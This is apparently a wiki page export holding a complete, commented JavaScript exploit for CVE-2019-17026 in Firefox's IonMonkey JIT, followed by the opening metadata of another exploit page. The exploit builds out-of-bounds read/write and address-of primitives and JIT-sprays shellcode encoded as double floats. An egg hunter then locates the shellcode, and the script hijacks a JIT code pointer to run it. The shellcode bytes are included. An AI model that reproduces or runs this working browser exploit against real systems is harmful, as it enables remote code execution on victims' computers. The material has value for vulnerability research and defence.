0x48, 0x89, 0xf0, 0x48, 0x8d, 0x0c, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xe0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x1c, 0x11, 0x48, 0x01, 0xd8, 0x48, 0x31, 0xd2, 0x48, 0x89, 0xc1, 0xe8, 0xf0, 0x00, 0x00, 0x00, 0x3b, 0x45, 0xf0, 0x0f, 0x85, 0xd3, 0x00, 0x00, 0x00, 0x48, 0x89, 0xf0, 0x48, 0x8d, 0x14, 0x00, 0x48, 0x8b, 0x45, 0xd8, 0x48, 0x0f, 0xb7, 0x04, 0x02, 0x48, 0x8d, 0x0c, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xd0, 0x48, 0x8b, 0x45, 0xf8, 0x8b, 0x1c, 0x11, 0x48, 0x01, 0xd8, 0x48, 0x89, 0x45, 0xc8, 0x48, 0x8b, 0x4d, 0xe8, 0x48, 0x89, 0xca, 0x48, 0x31, 0xdb, 0x8b, 0x5d, 0xc0, 0x48, 0x01, 0xda, 0x48, 0x39, 0xc8, 0x0f, 0x8c, 0x99, 0x00, 0x00, 0x00, 0x48, 0x39, 0xd0, 0x0f, 0x8d, 0x90, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x90, 0x48, 0x8d, 0x9d, 0xb0, 0xfd, 0xff, 0xff, 0x8a, 0x14, 0x08, 0x80, 0xfa, 0x00, 0x74, 0x28, 0x80, 0xfa, 0x2e, 0x75, 0x19, 0xc7, 0x03, 0x2e, 0x64, 0x6c, 0x6c, 0x48, 0x83, 0xc3, 0x04, 0xc6, 0x03, 0x00, 0x48, 0x8d, 0x9d, 0xb0, 0xfe, 0xff, 0xff, 0x48, 0xff, 0xc1, 0xeb, 0xda, 0x88, 0x13, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc3, 0xeb, 0xd0, 0xc6, 0x03, 0x00, 0x48, 0x31, 0xd2, 0x48, 0x8d, 0x8d, 0xb0, 0xfd, 0xff, 0xff, 0xe8, 0x46, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xe8, 0x4e, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x2e, 0x48, 0x89, 0x45, 0xb8, 0x48, 0x31, 0xd2, 0x48, 0x8d, 0x8d, 0xb0, 0xfe, 0xff, 0xff, 0xe8, 0x26, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc2, 0x48, 0x8b, 0x4d, 0xb8, 0xe8, 0x89, 0xfe, 0xff, 0xff, 0x48, 0x89, 0x45, 0xc8, 0xeb, 0x09, 0x48, 0xff, 0xc6, 0x90, 0xe9, 0xe7, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x45, 0xc8, 0x5e, 0x5f, 0x48, 0x89, 0xec, 0x5d, 0xc3, 0x57, 0x48, 0x89, 0xd7, 0x48, 0x31, 0xdb, 0x80, 0x39, 0x00, 0x74, 0x1a, 0x0f, 0xb6, 0x01, 0x0c, 0x60, 0x0f, 0xb6, 0xd0, 0x01, 0xd3, 0x48, 0xd1, 0xe3, 0x48, 0xff, 0xc1, 0x48, 0x85, 0xff, 0x74, 0xe6, 0x48, 0xff, 0xc1, 0xeb, 0xe1, 0x48, 0x89, 0xd8, 0x5f, 0xc3 ]);
var JITIterations = 0x10000; // Number of iterations needed to trigger JIT compilation of code. The compilation count threshold varies and this is typically overkill (10+ or 1000+ is often sufficient) but is the most stable count I've tested.
var HelperBuf = new ArrayBuffer(8);
var HelperDbl = new Float64Array(HelperBuf);
var HelperDword = new Uint32Array(HelperBuf);

////////
////////
// Debug/timer code
////////

var EnableDebug = false;
var EnableTimers = false;
var AlertOutput = false;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

/*//////
////////
// MIR Boundscheck elimination bug/OOB array logic
////////

This is the primary logic exploiting the vulnerability itself. Fundamentally
CVE-2019-17026 is an aliasing bug in the IonMonkey JIT engine: an overly
strict aliasing type criteria can cause a potentially dangerous node such as
MStoreElementHole to be discarded as a STORE dependency for a sensitive LOAD
node such as MBoundsCheck. Thus in the event that a similar MBoundsCheck has
already been declared within a JIT'd function, we can trick IonMonkey into
believing these instructions to be congruent which will result in the
elimination of the second MBoundsCheck by the GVN due to congruence rules:
- LOAD instructions may be tied to their most recent STORE instruction as
  dependencies during the aliasing phase of JIT compilation.
- After the aliasing phase comes the GVN phase, which eliminates redundant
  nodes via congruence rules for optimization purposes.
- In order for two matching nodes (such as two boundschecks) to be considered
  for redundancy elimination via congruence rules they must have matching
  STORE dependencies.
- In a secure engine (such as FF 72+) the MStoreElementHole node will ALWAYS
  be aliased to its following LOAD instruction regardless of whether operand
  types are perfectly matching. This will result in a boundscheck following
  an MStoreElementHole ALWAYS considering it to be a dependency and thus
  never resulting in boundscheck elimination.
- In an insecure engine (such as being exploited here) the MStoreElementHole
  node will only be aliased to a following MBoundsCheck node if the two meet
  operand type criteria.
- MStoreElementHole can be manipulated into acting upon a different operand
  type through use of a global sparse array. This will cause MBoundsCheck
  (which is acting upon a constant array object) to have a different operand
  type and thus thwart aliasing by IonMonkey.
- MStoreElementHole can also be used to trigger side-effects, such as setting
  the length field of an array to 0 and heap grooming to prepare for an OOB
  access to this array.
- As a result we may modify the .length field of an array prior to accessing
  it at an arbitrary index despite the boundscheck no longer existing.
  
The following code demonstrates the bug:

BugArray1[Index] = 4.2;
SideEffectArray[SideEffectIndex] = 2.2;
BugArray1[Index] = DblVal;

IonMonkey will produce nodes corresponding to these instructions:

MBoundsCheck
MStoreElement

MBoundsCheck
MStoreElementHole  &lt;- This node may trigger side-effects

MBoundsCheck       &lt;- This node will be eliminated by the optimizer
MStoreElement      &lt;- This node will be used for the OOB array R/W

Due to BugArray1[Index] having already been declared (and the boundscheck
executed) IonMonkey will eliminate the third boundscheck node. This allows us
to use the side-effect triggered by MStoreElementHole to set the modify the
BugArray11.length field and perform heap grooming prior to the final BugArray1
access.

The anatomy of an Array involves two data structures: a NativeObject which holds
the primary pointers relating to the Array element data, property types, etc.

struct NativeObject {
    void *GroupPtr;
    void *ShapePtr;
    void *SlotsPtr;
    void *ElementsPtr; // This does NOT point to the element metadata, it points OVER it to the actual element data itself.
}

Followed by an element metadata struct which holds data pertaining to the length,
capacity and initialization size of the elements data itself:

struct ElementsMetadata {
    uint32_t Flags;
    uint32_t InitializedLength; // The number of elements actually initialized (will be 0 when Array first declared). If you do Array(50) then set index 20 to something, the length will become 20 (and 0-19 will be allocated but marked uninitialized).
    uint32_t Capacity; // Storage allocated for the array
    uint32_t Length; // The literal .length property. Thus Array(50) even though it has an initialized length and capavity of 0 would have a length of 50.
    // ...
}

Followed finally by the actual element data of the array, which is pointed to
by the NativeObject.ElementsPtr.

The bug is converted into exploit primitives R/W/AddressOf by setting up 3
arrays in memory prior to executing the JIT bug:

BugArray1 = new Array(0x20);
BugArray2 = new Array(0x20);
MutableArray = new Array(0x20);

This will eventually result in the following memory layout in the nursery heap:

[BugArray1.NativeObject][BugArray1.ElementsMetadata][Element data][BugArray2.NativeObject][BugArray2.ElementsMetadata][Element data][MutableArray.NativeObject][MutableArray.ElementsMetadata][Element data]

Thus the OOB array access (via the JIT bug) will be used on BugArray1 to overwrite
BugArray2.ElementsMetadata. Subsequently, BugArray2 may be used to make OOB R/W
at will (without the need to repeat the JIT bug) and overwrite the 
MutableArray.NativeObject in order to build the primitives for the remainer of
the exploit.

Prior to doing this, it is essential to do some heap grooming to prepare for the
OOB array access from BugArray1 to corrupt BugArray2.ElementsMetadata. Re-visiting
the vulnerable JS code:

BugArray1[Index] = 4.2;
SideEffectArray[SideEffectIndex] = 2.2;
BugArray1[Index] = DblVal;

Access to the SideEffectArray may be used to trigger some arbitrary code of our
choice prior to the second (vulnerable/no boundscheck) BugArray1 access. This
is used to set the .length field of the BugArray1, BugArray2 and MutableArray
arrays to zero and trigger the garbage collector. After doing so, these three
arrays will appear on the nursery heap as follows:

000000000B5BF100  000000000B5A5A60  &lt;- BugArray1.NativeObject
000000000B5BF108  000000000B5C21C8 
000000000B5BF110  0000000000000000  
000000000B5BF118  000000000B5BF130  &lt;- BugArray1.NativeObject.ElementsPtr
000000000B5BF120  0000000000000000  &lt;- BugArray1.ElementsMetadata
000000000B5BF128  0000000000000006  
000000000B5BF130  FFFA800000000000  &lt;- BugArray1 raw element data
000000000B5BF138  FFFA800000000000  
000000000B5BF140  FFFA800000000000  
000000000B5BF148  FFFA800000000000  
000000000B5BF150  FFFA800000000000  
000000000B5BF158  FFFA800000000000  
000000000B5BF160  000000000B5A5A90  &lt;- BugArray2.NativeObject
000000000B5BF168  000000000B5C21C8  
000000000B5BF170  0000000000000000  
000000000B5BF178  000000000B5BF190  
000000000B5BF180  0000007E00000000  &lt;- Overwritten BugArray2.ElementsMetadata (note QWORD index 10 from the start of BugArray1.NativeObject.ElementsPtr)
000000000B5BF188  0000007E0000007E  
000000000B5BF190  0000000000000000  &lt;- BugArray2 raw element data
000000000B5BF198  0000000000000000  
000000000B5BF1A0  0000000000000000  
000000000B5BF1A8  0000000000000000  
000000000B5BF1B0  0000000000000000  
000000000B5BF1B8  0000000000000000  
000000000B5BF1C0  000000000B5A5AC0  &lt;- MutableArray.NativeObject
000000000B5BF1C8  000000000B5C21C8 
000000000B5BF1D0  0000000000000000  
000000000B5BF1D8  000000000B5BF1F0  
000000000B5BF1E0  0000000000000000  &lt;- MutableArray.ElementsMetadata
000000000B5BF1E8  0000000000000006  
000000000B5BF1F0  0000000000000000  &lt;- MutableArray raw element data
000000000B5BF1F8  0000000000000000  
000000000B5BF200  0000000000000000  

This layout is then used in conjunction with the JIT bug to begin the array
corruption.
*/

// Note that these arrays cannot be declared as vars
SideEffectArray = [1.1, 1.2, , 1.4]; // MStoreElementHole access to a global sparse array is the unique edge case causes aliasing with MBoundsCheck to fail due to operand type mismatch
BugArray1 = new Array(0x20); // This array will be used (after heap grooming) to make the OOB overwrite of BugArray2.ElementsMetadata. The heap grooming requires the .length be set to 0, but the length will not matter due to boundscheck elimination (the capacity however still will).
BugArray2 = new Array(0x20); // This array will be used to read and set pointers reliably and repeatably in MutableArray
MutableArray = new Array(0x20); // The NativeObject of this array are corrupted to build the exploit primitives

SideEffectArray.__defineSetter__("-1", function(x) { // Side effects called for OOB SideEffectArray access at index -1
    // Key to understand here is that setting these lengths to 0 and having GC manipulate them into pointing at each other could be done without the boundscheck elimination bug. The boundscheck elimination bug however is what allows them to actually access each other, as it is necessary to set .length to 0 to do the GC trick and the boundschecks are based on .length. Note that access to all of these arrays will still be limited by their capacity metadata field despite elimination of their .length boundscheck.
    BugArray1.length = 0;
    BugArray2.length = 0;
    MutableArray.length = 0;
    GC();
});

function GC() { // Call the GC - Phoenhex function
    BufSize = (128 * 1024 * 1024); // 128MB
    
    for(var i = 0; i &lt; 3; i++) {
        var x = new ArrayBuffer(BufSize); // Allocate locally, but don't save
    }
}

function BuggedJITFunc(SideEffectIndex, Index, DblVal) {
    // Removes future bounds checks with GVN
    
    BugArray1[Index] = 4.2;
    BugArray1[Index - 1] = 4.2;

    // Triggers the side-effect function when a -1 index provided
    
    SideEffectArray[SideEffectIndex] = 2.2;

    // Write OOB and corrupt BugArray2.ElementsMetadata. Normally boundscheck would prevent this based on .length. Note that despite the bugged elimination of this check, access is still limited to the BugArray1.ElementsMetadata capacity metadata field.
    
    BugArray1[Index] = DblVal; // Corrupt the BugArray2.ElementsMetadata capacity and length element metadata - 0x7e 0x00 0x00 0x00 0x7e 0x00 0x00 0x00
    BugArray1[Index - 1] = 2.673714696616e-312; // Corrupt the BugArray2.ElementsMetadata flags and initialized length element metadata - 0x00 0x00 0x00 0x00 0x7e 0x00 0x00 0x00
}

for(var i = 0; i &lt; JITIterations; i++) {
    SideEffectArray.length = 4; // Reset the length so that StoreElementHole node is used
    BuggedJITFunc(5, 11, 2.67371469724e-312);
}

// Call the JIT'd bugged function one more time, this time with an OOB write index of -1. There is substantial significance to using -1 as opposed to some other (larger) index which would still go OOB and trigger a side effect. The reason being that -1 is considered an "invalid index" (not just an OOB index) and is treated differently. OOB writes to the SideEffectArray with valid albeit indexes which will fail the boundscheck restrictions and will not trigger useful side effects. The reason for this being that access to valid indexes will cause the creation of a MSetPropertyCache node in the MIR, a node which is not susceptible to the exploit condition. The MIR instruction chosen to handle the SideEffectArray OOB MUST be MStoreElementHole, and MStoreElementHole will only be selected in the event of an INVALID index access, not simply an OOB one.

SideEffectArray.length = 4; // Reset the length one more time
BuggedJITFunc(-1, 11, 2.67371469724e-312);

// Initialize mutable array properties for R/W/AddressOf primitives. Use these specific values so that it can later be verified whether slots pointer modifications have been successful.

MutableArray.x = 5.40900888e-315; // Most significant bits are 0 - no tag, allows an offset of 4 to be treated as a double
MutableArray.y = 0x41414141;
MutableArray.z = 0; // Least significant bits are 0 - offset of 4 means that y will be treated as a double

/*//////
////////
// Arbitrary read/write/address-of primitives
////////

~ Weak arbitrary read

8 bytes of data can be leaked from the address pointed to by the mutable array
NativeObject.SlotsPtr, as this address is interpreted as holding the value of
'x' (stored as a double). The drawback is that if the 8 bytes cannot be 
interpreted as a valid double, they may be interpreted as a pointer and
dereferenced. In this sense, some values may not be be readable with this
primitive.

~ Weak arbitrary write

In the same way that the 'x' property pointed at by the slots pointer can be
used to read doubles it can also be used to write doubles. The only drawback
being that the value being written must be a valid double.

~ Weak AddressOf

The mutable array slots pointer (in its native object struct) is going to be
pointing at an array of 3 property values (for x, y and z). Since we are
trying to leak the object address (which will be written into the property
array slots for x, y or z) as a double, this will cause issues as the JS engine
will (correctly) attempt to dereference this address rather than interpret it
as a double.

Thus the trick is to set the slots pointer in the mutable array native object
ahead by 4 bytes. This the result that the object address (previously only in
the "y" slot) can now be partially read (32-bits at a time) from both "x" and
"y" and that these values are now certain to be valid doubles.

We can ensure the resulting double is valid by using bitwise AND to filter off
the significant bits responsible for differentiating between a valid and
non-valid double.

~ Strong arbitrary read

This primitive solves the issue of attempting to read 8 bytes in memory which
may be invalid doubles and thus misinterpreted as pointers (for example if the
tagged pointer bits are set).

The solution is to simply create a double float array, and then overwrite its
data pointer to point to the precise region we want to read. The key concept
here is that it reduces the ambiguity on the part of the JS engine. Since the
JS engine knows that the value at this address is explicitly a double float,
it will not attempt to potentially interprete it as an object pointer even if
those tagged bits are set.
*/

function WeakLeakDbl(TargetAddress) {
    SavedSlotsPtr = BugArray2[8];
    BugArray2[8] = TargetAddress;
    LeakedDbl = MutableArray.x;
    BugArray2[8] = SavedSlotsPtr;
    return LeakedDbl;
}

function WeakWriteDbl(TargetAddress, Val) { 
    SavedSlotsPtr = BugArray2[8];
    BugArray2[8] = TargetAddress;
    MutableArray.x = Val;
    BugArray2[8] = SavedSlotsPtr;
}

function WeakLeakObjectAddress(Obj) {
    SavedSlotsPtr = BugArray2[8]; 
    
    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -&gt; [0x????????????????] | [Target object address] | [0x????????????????]
    MutableArray.y = Obj;

    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -&gt; [0x????????Target o] | [bject adress????????] | [0x????????????????]
    
    HelperDbl[0] = BugArray2[8];
    HelperDword[0] = HelperDword[0] + 4;
    BugArray2[8] = HelperDbl[0];
    
    // Patch together a double of the target object address from the two 32-bit property values
    
    HelperDbl[0] = MutableArray.x;
    LeakedLow = HelperDword[1];
    HelperDbl[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
    LeakedHigh = HelperDword[0] &amp; 0x00007fff; // Filter off tagged pointer bits
    BugArray2[8] = SavedSlotsPtr;
    HelperDword[0] = LeakedLow;
    HelperDword[1] = LeakedHigh;
    
    return HelperDbl[0];
}

ExplicitDblArray = new Float64Array(1); // Used for the strong read
ExplicitDblArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read

function ExplicitLeakDbl(TargetAddress) {
    WeakWriteDbl(ExplicitDblArrayDataPtr, TargetAddress);
    return ExplicitDblArray[0];
}

/*//////
////////
// JIT spray/egghunter shellcode logic
////////

JIT spray in modern Firefox 64-bit on Windows seems to behave very differently
when a special threshold of 100 double float constants are planted into a single
function and JIT sprayed. When more than 100 are implanted, the JIT code pointer
for the JIT sprayed function will look as follows:

00000087EB6F5280 | E9 23000000              | jmp 87EB6F52A8                   &lt;- JIT code pointer for JIT sprayed function points here
00000087EB6F5285 | 48:B9 00D0F2F8F1000000   | mov rcx,F1F8F2D000                   
00000087EB6F528F | 48:8B89 60010000         | mov rcx,qword ptr ds:[rcx+160]       
00000087EB6F5296 | 48:89A1 D0000000         | mov qword ptr ds:[rcx+D0],rsp        
00000087EB6F529D | 48:C781 D8000000 0000000 | mov qword ptr ds:[rcx+D8],0          
00000087EB6F52A8 | 55                       | push rbp                             
00000087EB6F52A9 | 48:8BEC                  | mov rbp,rsp                          
00000087EB6F52AC | 48:83EC 48               | sub rsp,48                           
00000087EB6F52B0 | C745 E8 00000000         | mov dword ptr ss:[rbp-18],0          
...
00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141                 &lt;- Note the first double float being loaded into RBX        
00000087EB6F5341 | 53                       | push rbx                             
00000087EB6F5342 | 49:BB D810EAFCF1000000   | mov r11,F1FCEA10D8                   
00000087EB6F534C | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F534F | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F5351 | 48:83C4 08               | add rsp,8                            
00000087EB6F5355 | 48:B9 40807975083D0000   | mov rcx,3D0875798040                 
00000087EB6F535F | 49:BB E810EAFCF1000000   | mov r11,F1FCEA10E8                   
00000087EB6F5369 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F536C | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F536E | 48:BB 9090554889E54883   | mov rbx,8348E58948559090             
00000087EB6F5378 | 53                       | push rbx                             
00000087EB6F5379 | 49:BB F810EAFCF1000000   | mov r11,F1FCEA10F8              
00000087EB6F5383 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F5386 | FF17                     | call qword ptr ds:[rdi]              
00000087EB6F5388 | 48:83C4 08               | add rsp,8                            
00000087EB6F538C | 48:B9 40807975083D0000   | mov rcx,3D0875798040                 
00000087EB6F5396 | 49:BB 0811EAFCF1000000   | mov r11,F1FCEA1108              
00000087EB6F53A0 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]           
00000087EB6F53A3 | FF17                     | call qword ptr ds:[rdi]                              
...

Rather than implanting the double float constants into the JIT'd code region as
an array of raw constant data, the JIT engine has created a (very large) quantity
of code which manually handles each individual double float one by one (this code
goes on much further than I have pasted here). You can see this at:

00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141  

This is the first double float 5.40900888e-315 (the stage one shellcode egg)
being loaded into RBX, where each subsequent double is treated the same.

In contrast, any JIT sprayed function with less than 100 double floats yields
a substantially different region of code at its JIT code pointer:

000002C6944D4470 | 48:8B4424 20             | mov rax,qword ptr ss:[rsp+20]    &lt;- JIT code pointer for JIT sprayed function points here
000002C6944D4475 | 48:C1E8 2F               | shr rax,2F                              
000002C6944D4479 | 3D F3FF0100              | cmp eax,1FFF3                           
000002C6944D447E | 0F85 A4060000            | jne 2C6944D4B28                         
...
000002C6944D4ACB | F2:0F1180 C00A0000       | movsd qword ptr ds:[rax+AC0],xmm0       
000002C6944D4AD3 | F2:0F1005 6D030000       | movsd xmm0,qword ptr ds:[2C6944D4E48]   
000002C6944D4ADB | F2:0F1180 C80A0000       | movsd qword ptr ds:[rax+AC8],xmm0       
000002C6944D4AE3 | F2:0F1005 65030000       | movsd xmm0,qword ptr ds:[2C6944D4E50]   
000002C6944D4AEB | F2:0F1180 D00A0000       | movsd qword ptr ds:[rax+AD0],xmm0       
000002C6944D4AF3 | F2:0F1005 5D030000       | movsd xmm0,qword ptr ds:[2C6944D4E58]   
000002C6944D4AFB | F2:0F1180 D80A0000       | movsd qword ptr ds:[rax+AD8],xmm0       
000002C6944D4B03 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000                
000002C6944D4B0D | C3                       | ret                                     
000002C6944D4B0E | 90                       | nop                                     
000002C6944D4B0F | 90                       | nop                                     
000002C6944D4B10 | 90                       | nop                                     
000002C6944D4B11 | 90                       | nop                                     
000002C6944D4B12 | 90                       | nop                                     
000002C6944D4B13 | 90                       | nop                                     
000002C6944D4B14 | 90                       | nop                                     
000002C6944D4B15 | 90                       | nop                                     
000002C6944D4B16 | 49:BB 30B14E5825000000   | mov r11,25584EB130                      
000002C6944D4B20 | 41:53                    | push r11                                
000002C6944D4B22 | E8 C9C6FBFF              | call 2C6944911F0                        
000002C6944D4B27 | CC                       | int3                                    
000002C6944D4B28 | 6A 00                    | push 0                                  
000002C6944D4B2A | E9 11000000              | jmp 2C6944D4B40                         
000002C6944D4B2F | 50                       | push rax                                
000002C6944D4B30 | 68 20080000              | push 820                                
000002C6944D4B35 | E8 5603FCFF              | call 2C694494E90                        
000002C6944D4B3A | 58                       | pop rax                                 
000002C6944D4B3B | E9 85F9FFFF              | jmp 2C6944D44C5                         
000002C6944D4B40 | 6A 00                    | push 0                                  
000002C6944D4B42 | E9 D9C5FBFF              | jmp 2C694491120                         
000002C6944D4B47 | F4                       | hlt                                     
000002C6944D4B48 | 41414141:0000            | add byte ptr ds:[r8],al          &lt;- JIT sprayed egg double
000002C6944D4B4E | 0000                     | add byte ptr ds:[rax],al                
000002C6944D4B50 | 90                       | nop                              &lt;- JIT sprayed shellcode begins here
000002C6944D4B51 | 90                       | nop                                     
000002C6944D4B52 | 55                       | push rbp                                
000002C6944D4B53 | 48:89E5                  | mov rbp,rsp                             
000002C6944D4B56 | 48:83EC 40               | sub rsp,40                              
000002C6944D4B5A | 48:83EC 08               | sub rsp,8                               
000002C6944D4B5E | 40:80E4 F7               | and spl,F7                              
000002C6944D4B62 | 48:B8 1122334455667788   | mov rax,8877665544332211                
000002C6944D4B6C | 48:8945 C8               | mov qword ptr ss:[rbp-38],rax           
000002C6944D4B70 | 48:C7C1 884E0D00         | mov rcx,D4E88                           
000002C6944D4B77 | E8 F9000000              | call 2C6944D4C75                        

This then introduces another constaint on JIT spraying beyoond forcing your
assembly bytecode to be 100% valid double floats. You are also limited to a
maximum of 100 doubles (800 bytes) including your egg prefix.
*/

function JITSprayFunc(){
    Egg = 5.40900888e-315; // AAAA\x00\x00\x00\x00
    X1 = 58394.27801956298;
    X2 = -3.384548150597339e+269;
    X3 = -9.154525457562153e+192;
    X4 = 4.1005939302288804e+42;
    X5 = -5.954550387086224e-264;
    X6 = -6.202600667005017e-264;
    X7 = 3.739444822644755e+67;
    X8 = -1.2650161464211396e+258;
    X9 = -2.6951286493033994e+35;
    X10 = 1.3116505146398627e+104;
    X11 = -1.311379727091241e+181;
    X12 = 1.1053351980286266e-265;
    X13 = 7.66487078033362e+42;
    X14 = 1.6679557218696946e-235;
    X15 = 1.1327634929857868e+27;
    X16 = 6.514949632148056e-152;
    X17 = 3.75559130646382e+255;
    X18 = 8.6919639111614e-311;
    X19 = -1.0771492276655187e-142;
    X20 = 1.0596460749348558e+39;
    X21 = 4.4990090566228275e-228;
    X22 = 2.6641556100123696e+41;
    X23 = -3.695293685173417e+49;
    X24 = 7.675324624976707e-297;
    X25 = 5.738262935249441e+40;
    X26 = 4.460149175031513e+43;
    X27 = 8.958658002980807e-287;
    X28 = -1.312880373645135e+35;
    X29 = 4.864674571015197e+42;
    X30 = -2.500435320470142e+35;
    X31 = -2.800945285957394e+277;
    X32 = 1.44103957698964e+28;
    X33 = 3.8566513062216665e+65;
    X34 = 1.37405680231e-312;
    X35 = 1.6258034990195507e-191;
    X36 = 1.5008582713363865e+43;
    X37 = 3.1154847750709123;
    X38 = -6.809578792021008e+214;
    X39 = -7.696699288147737e+115;
    X40 = 3.909631192677548e+112;
    X41 = 1.5636948002514616e+158;
    X42 = -2.6295656969507476e-254;
    X43 = -6.001472476578534e-264;
    X44 = 9.25337251529007e-33;
    X45 = 4.419915842157561e-80;
    X46 = 8.07076629722016e+254;
    X47 = 3.736523284e-314;
    X48 = 3.742120352320771e+254;
    X49 = 1.0785207713761078e-32;
    X50 = -2.6374368557341455e-254;
    X51 = 1.2702053652464168e+145;
    X52 = -1.3113796337500435e+181;
    X53 = 1.2024564583763433e+111;
    X54 = 1.1326406542153807e+104;
    X55 = 9.646933740426927e+39;
    X56 = -2.5677414592270957e-254;
    X57 = 1.5864445474697441e+233;
    X58 = -2.6689139052065564e-251;
    X59 = 1.0555057376604044e+27;
    X60 = 8.364524068863995e+42;
    X61 = 3.382975178824556e+43;
    X62 = -8.511722322449098e+115;
    X63 = -2.2763239573787572e+271;
    X64 = -6.163839243926498e-264;
    X65 = 1.5186209005088964e+258;
    X66 = 7.253360348539147e-192;
    X67 = -1.2560830051206045e+234;
    X68 = 1.102849544e-314;
    X69 = -2.276324008154652e+271;
    X70 = 2.8122150524016884e-71;
    X71 = 5.53602304257365e-310;
    X72 = -6.028598990540894e-264;
    X73 = 1.0553922879130128e+27;
    X74 = -1.098771600725952e-244;
    X75 = -2.5574368247075522e-254;
    X76 = 3.618778572061404e-171;
    X77 = -1.4656824334476123e+40;
    X78 = 4.6232700581905664e+42;
    X79 = -3.6562604268727894e+125;
    X80 = -2.927408487880894e+78;
    X81 = 1.087942540606703e-309;
    X82 = 6.440226123500225e+264;
    X83 = 3.879424446462186e+148;
    X84 = 3.234472631797124e+40;
    X85 = 1.4186706350383543e-307;
    X86 = 1.2617245769382784e-234;
    X87 = 1.3810793979336581e+43;
    X88 = 1.565026152201332e+43;
    X89 = 5.1402745833993635e+153;
    X90 = 9.63e-322;
}

function EggHunter(TargetAddressDbl) {
    HelperDbl[0] = TargetAddressDbl;

    for(var i = 0; i &lt; 1000; i++) { // 1000 QWORDs give me the most stable result. The more double float constants are in the JIT'd function, the more handler code seems to precede them.
        DblVal = ExplicitLeakDbl(HelperDbl[0]); // The JIT'd ASM code being scanned is likely to contain 8 byte sequences which will not be interpreted as doubles (and will have tagged pointer bits set). Use explicit/strong primitive for these reads.
        
        if(DblVal == 5.40900888e-315) {
            HelperDword[0] = HelperDword[0] + 8; // Skip over egg bytes and return precise pointer to the shellcode
            return HelperDbl[0];
        }
        
        HelperDword[0] = HelperDword[0] + 8;
    }
    
    return 0.0;
}


////////
////////
// Primary high level exploit logic
////////
    
function Exploit() {
    for(var i = 0; i &lt; JITIterations; i++) {
        JITSprayFunc(); // JIT spray the shellcode to a private +RX region of virtual memory
    }
    
    HelperDbl[0] = WeakLeakObjectAddress(JITSprayFunc); // The JSFunction object address associated with the (now JIT compiled) shellcode data.
    HelperDword[0] = HelperDword[0] + 0x30; // JSFunction.u.native.extra.jitInfo_ contains a pointer to the +RX JIT region at offset 0 of its struct.
    JITInfoAddress = WeakLeakDbl(HelperDbl[0]);
    HelperDbl[0] = JITInfoAddress;
    
    // Verify that MutableArray.x was not its initialized value during the last arbitrary read. This would only be the case if the slots ptr has NEVER been successfully overwritten post-addrof primitive (the address we attempted to read was not a valid double).
    
    if(HelperDword[0] == 0x41414141) {
        DebugLog("Arbitrary read primitive failed");
        window.location.reload();
    }
    else {
        // Setup the strong read primitive for the stage one egg hunter: attempting to interpret assembly byte code as doubles via weak primitive may crash the process (tagged pointer bits could cause the read value to be dereferenced as a pointer)
        
        HelperDbl[0] = WeakLeakDbl(JITInfoAddress); // Leak the address to the compiled JIT assembly code associated with the JIT'd shellcode function from its JitInfo struct (it is a pointer at offset 0 of this struct)
        DebugLog("Shellcode function object JIT code pointer is 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
        JITCodePtr = HelperDbl[0];
        ExplicitDblArrayAddress = WeakLeakObjectAddress(ExplicitDblArray);
        HelperDbl[0] = ExplicitDblArrayAddress;
        HelperDword[0] = HelperDword[0] + 56; // Float64Array data pointer
        ExplicitDblArrayDataPtr = HelperDbl[0];
        ShellcodeAddress = EggHunter(JITCodePtr); // For this we need the strong read primitive since values here can start with 0xffff and thus act as tags

        if(ShellcodeAddress) {
            // Trigger code exec by calling the JIT sprayed function again. Its code pointer has been overwritten to now point to the literal shellcode data within the JIT'd function
            
            WeakWriteDbl(JITInfoAddress, ShellcodeAddress);
            JITSprayFunc(); // Notably the location of the data in the stage two shellcode Uint8Array can be found at offset 0x40 from the start of the array object when the array is small, and when it is large (as in the case of the WPAD shellcode) a pointer to it can be found at offset 0x38 from the start of the array object. In this case though, the stage one egg hunter shellcode finds, disables DEP and ADDITIONALLY executes the stage two shellcode itself, so there is no reason to locate/execute it from JS.
        }
        else {
            DebugLog("Failed to resolve shellcode address");
        }
    }
}

Exploit();
&lt;/pre&gt;</text>
      <sha1>9wrqcwwkiuetku68k35oyuzzu93f8bb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-17624 X Server 本地棧溢出漏洞</title>
    <ns>0</ns>
    <id>1338</id>
    <revision>
      <id>1678</id>
      <timestamp>2021-04-15T05:47:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
